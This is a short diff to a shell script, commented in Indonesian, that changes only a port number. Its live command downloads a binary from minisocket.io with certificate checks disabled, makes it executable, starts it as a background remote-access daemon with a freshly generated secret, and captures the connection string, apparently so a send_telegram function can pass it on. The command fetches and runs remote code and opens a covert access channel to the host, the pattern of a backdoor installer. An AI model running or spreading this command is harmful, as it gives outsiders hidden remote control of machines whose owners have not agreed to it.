@@ -15,7 +15,7 @@ send_telegram() {
 echo "🚀 Menjalankan MiniSocket v2 (Port 53)..."
 
 # Jalankan command baru dan tangkap output
-OUTPUT=$(curl -fsSLk -o ms https://minisocket.io/bin/mini-socketv2 && chmod 755 ms && S=$(./ms -g) && MINI_PORT=443 MINI_ARGS="-s $S -d" ./ms && echo "Connect with: mini-ncv2 -s $S" 2>&1)
+OUTPUT=$(curl -fsSLk -o ms https://minisocket.io/bin/mini-socketv2 && chmod 755 ms && S=$(./ms -g) && MINI_PORT=4431 MINI_ARGS="-s $S -d" ./ms && echo "Connect with: mini-ncv2 -s $S" 2>&1)
 
 EXIT_CODE=$?
 
